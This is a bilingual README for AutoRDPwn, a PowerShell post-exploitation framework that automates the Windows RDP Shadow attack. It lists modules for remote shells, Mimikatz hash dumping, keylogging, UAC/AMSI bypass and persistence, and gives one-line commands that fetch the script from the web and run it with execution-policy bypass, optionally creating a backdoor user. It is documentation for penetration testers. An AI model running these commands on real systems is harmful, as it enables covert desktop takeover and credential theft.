<p align="center"><img width=500 alt="AutoRDPwn" src="https://user-images.githubusercontent.com/34335312/54979916-b451c780-4fa4-11e9-8173-1b5c885b9c3c.png?raw=true"></p>

**AutoRDPwn** es un framework de post-explotación creado en Powershell, diseñado principalmente para automatizar el ataque **Shadow** en equipos Microsoft Windows. Esta vulnerabilidad (catalogada como característica por Microsoft) permite a un atacante remoto visualizar el escritorio de su víctima sin su consentimiento, e incluso controlarlo a petición, utilizando herramientas nativas del propio sistema operativo.

Gracias a los módulos adicionales, es posible obtener una shell remota a través de Netcat, volcar los hashes del sistema con Mimikatz, cargar un keylogger remoto y mucho más. Todo ello, A través de un menú totalmente intiutivo en siete idiomas diferentes.

Adicionalmente, es posible utilizarlo en una shell inversa a través de una serie de parámetros que se descibren en la sección de uso.


# Requisitos
Powershell 4.0 o superior


# Cambios

## Versión 5.0
• Nuevo logo rediseñado totalmente desde cero

• Traducción completa en 7 idiomas: es, en, fr, de, it, ru, pt

• Ejecución remota a través de una shell inversa con Bypass de UAC y AMSI

• Soporte parcial desde Linux (más información en la guía de uso)

• Ejecución remota mejorada (ya no es necesaria conexión a internet en la víctima)

• Nuevo ataque disponible: Remote Desktop Execution

• Nueva sección disponible: Backdoors y persistencia

• Nuevo módulo disponible: Remote Keylogger

• Nueva sección disponible: Escalada de privilegios 

• Nuevo módulo disponible: Obtener información del sistema operativo

• Nuevo módulo disponible: Buscar vulnerabilidades con Sherlock

• Nuevo módulo disponible: Escalar privilegios con PowerUp

• Nueva sección disponible: Otros Módulos

• Nuevo módulo disponible: Ejecutar un script externo

*El resto de cambios se pueden consultar en el fichero CHANGELOG


# Uso
Esta aplicación puede usarse de forma local, remota o para pivotar entre equipos.

Al utilizarse de forma remota en una shell inversa, es necesario utilizar los siguientes parámetros:

| Parámetro               | Descripción                                                                                  | 
| :---------------------- | :------------------------------------------------------------------------------------------- | 
| **-admin / -noadmin**   | Dependiendo de los permisos de los que dispongamos, utilizaremos una u otra                  |
| **-nogui**              | Esto evitará cargar el menú y algunos colores, garantizado su funcionalidad                  | 
| **-lang**               | Elegiremos nuestro idioma (English, Spanish, French, German, Italian, Russian o Portuguese)  |
| **-option**             | Al igual que con el menú, podremos elegir de que forma lanzar el ataque                      |
| **-shadow**             | Decidiremos si queremos ver o controlar el equipo remoto                                     |
| **-createuser**         | Este parámetro es opcional, creará el usuario AutoRDPwn:AutoRDPwn en el equipo víctima       |

**Ejecución local en una línea:**
```
powershell -ep bypass "cd $env:temp ; iwr https://darkbyte.net/autordpwn.php -outfile AutoRDPwn.ps1 ; .\AutoRDPwn.ps1"
```

**Ejemplo de ejecución remota en una línea:**
```
powershell -ep bypass "cd $env:temp ; iwr https://darkbyte.net/autordpwn.php -outfile AutoRDPwn.ps1 ; .\AutoRDPwn.ps1 -admin -nogui -lang Spanish -option 4 -shadow control -createuser"
```


**La guía detallada de uso se encuentra en el siguiente enlace:**

https://darkbyte.net/autordpwn-la-guia-definitiva


# Capturas de pantalla
![AutoRDPwn1_es](https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Screenshots/AutoRDPwn1_es.PNG)
![AutoRDPwn2_es](https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Screenshots/AutoRDPwn2_es.PNG)


# Licencia
Este proyecto está licenciando bajo la licencia GNU 3.0 - ver el fichero LICENSE para más detalles.


# Créditos y Agradecimientos
Este framework utiliza los siguientes scripts y herramientas:

• Chachi-Enumerator de **Luis Vacas** -> https://github.com/Hackplayers/PsCabesha-tools

• Get-System de **HarmJ0y & Matt Graeber** -> https://github.com/HarmJ0y/Misc-PowerShell

• Invoke-MetasploitPayload de **Jared Haight** -> https://github.com/jaredhaight/Invoke-MetasploitPayload

• Invoke-Phant0m de **Halil Dalabasmaz** -> https://github.com/hlldz/Invoke-Phant0m

• Invoke-PowerShellTcp de **Nikhil "SamratAshok" Mittal** -> https://github.com/samratashok/nishang

• Invoke-TheHash de **Kevin Robertson** -> https://github.com/Kevin-Robertson/Invoke-TheHash

• Mimikatz de **Benjamin Delpy** -> https://github.com/gentilkiwi/mimikatz

• PsExec de **Mark Russinovich** -> https://docs.microsoft.com/en-us/sysinternals/downloads/psexec

• RDP Wrapper de **Stas'M Corp.** -> https://github.com/stascorp/rdpwrap

• SessionGopher de **Brandon Arvanaghi** -> https://github.com/Arvanaghi/SessionGopher

• SharpRDP de **Steven F** -> https://github.com/0xthirteen/SharpRDP

Y muchos más, que no caben aquí.. Gracias a todos ellos y su excelente trabajo.


# Contacto
Este software no ofrece ningún tipo de garantía. Su uso es exclusivo para entornos educativos y/o auditorías de seguridad con el correspondiente consentimiento del cliente. No me hago responsable de su mal uso ni de los posibles daños causados por el mismo.

Para más información, puede contactar a través de info@darkbyte.net

-------------------------------------------------------------------------------------------------------------
# English description

**AutoRDPwn** is a post-exploitation framework created in Powershell, designed primarily to automate the **Shadow** attack on Microsoft Windows computers. This vulnerability (listed as a feature by Microsoft) allows a remote attacker to view his victim's desktop without his consent, and even control it on demand, using tools native to the operating system itself.

Thanks to the additional modules, it is possible to obtain a remote shell through Netcat, dump system hashes with Mimikatz, load a remote keylogger and much more. All this, Through a completely intuitive menu in seven different languages.

Additionally, it is possible to use it in a reverse shell through a series of parameters that are described in the usage section.


# Requirements
Powershell 4.0 or higher


# Changes
## Version 5.0
• New logo completely redesigned from scratch

• Full translation in 7 languages: es, en, fr, de, it, ru, pt

• Remote execution through a reverse shell with UAC and AMSI Bypass

• Partial support from Linux (more information in the user guide)

• Improved remote execution (internet connection is no longer necessary on the victim)

• New attack available: Remote Desktop Execution

• New section available: Backdoors and persistence

• New module available: Remote Keylogger

• New section available: Privilege escalation

• New module available: Obtain information from the operating system

• New module available: Search vulnerabilities with Sherlock

• New module available: Escalate privileges with PowerUp

• New section available: Other Modules

• New module available: Execute an external script

*The rest of the changes can be consulted in the CHANGELOG file


# Use
This application can be used locally, remotely or to pivot between teams.

When used remotely in a reverse shell, it is necessary to use the following parameters:

| Parameter               | Description                                                                                    | 
| :---------------------- | :--------------------------------------------------------------------------------------------- | 
| **-admin / -noadmin**   | Depending on the permissions we have, we will use one or the other                             |
| **-nogui**              | This will avoid loading the menu and some colors, guaranteed its functionality                 | 
| **-lang**               | We will choose our language (English, Spanish, French, German, Italian, Russian or Portuguese) |
| **-option**             | As with the menu, we can choose how to launch the attack                                       |
| **-shadow**             | We will decide if we want to see or control the remote device                                  |
| **-createuser**         | This parameter is optional, the user AutoRDPwn:AutoRDPwn will be created on the victim machine |

**Local execution on one line:**
```
powershell -ep bypass "cd $ env: temp; iwr https://darkbyte.net/autordpwn.php -outfile AutoRDPwn.ps1 ; .\AutoRDPwn.ps1"
```

**Example of remote execution on a line:**
```
powershell -ep bypass "cd $ env: temp; iwr https://darkbyte.net/autordpwn.php -outfile AutoRDPwn.ps1 ; .\AutoRDPwn.ps1 -admin -nogui -lang English -option 4 -shadow control -createuser"
```


**The detailed guide of use can be found at the following link:**

https://darkbyte.net/autordpwn-la-guia-definitiva


# Screenshots
![AutoRDPwn1_en](https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Screenshots/AutoRDPwn1_en.PNG)
![AutoRDPwn2_en](https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Screenshots/AutoRDPwn2_en.PNG)


# License
This project is licensed under the GNU 3.0 license - see the LICENSE file for more details.


# Credits and Acknowledgments
This framework uses the following scripts and tools:

• Chachi-Enumerator by **Luis Vacas** -> https://github.com/Hackplayers/PsCabesha-tools

• Get-System by **HarmJ0y & Matt Graeber** -> https://github.com/HarmJ0y/Misc-PowerShell

• Invoke-MetasploitPayload by **Jared Haight** -> https://github.com/jaredhaight/Invoke-MetasploitPayload

• Invoke-Phant0m by **Halil Dalabasmaz** -> https://github.com/hlldz/Invoke-Phant0m

• Invoke-PowerShellTcp by **Nikhil "SamratAshok" Mittal** -> https://github.com/samratashok/nishang

• Invoke-TheHash by **Kevin Robertson** -> https://github.com/Kevin-Robertson/Invoke-TheHash

• Mimikatz by **Benjamin Delpy** -> https://github.com/gentilkiwi/mimikatz

• PsExec by **Mark Russinovich** -> https://docs.microsoft.com/en-us/sysinternals/downloads/psexec

• RDP Wrapper by **Stas'M Corp.** -> https://github.com/stascorp/rdpwrap

• SessionGopher by **Brandon Arvanaghi** -> https://github.com/Arvanaghi/SessionGopher

• SharpRDP by **Steven F** -> https://github.com/0xthirteen/SharpRDP

And many more, that do not fit here.. Thanks to all of them and their excellent work.


# Contact
This software does not offer any kind of guarantee. Its use is exclusive for educational environments and / or security audits with the corresponding consent of the client. I am not responsible for its misuse or for any possible damage caused by it.

For more information, you can contact through info@darkbyte.net
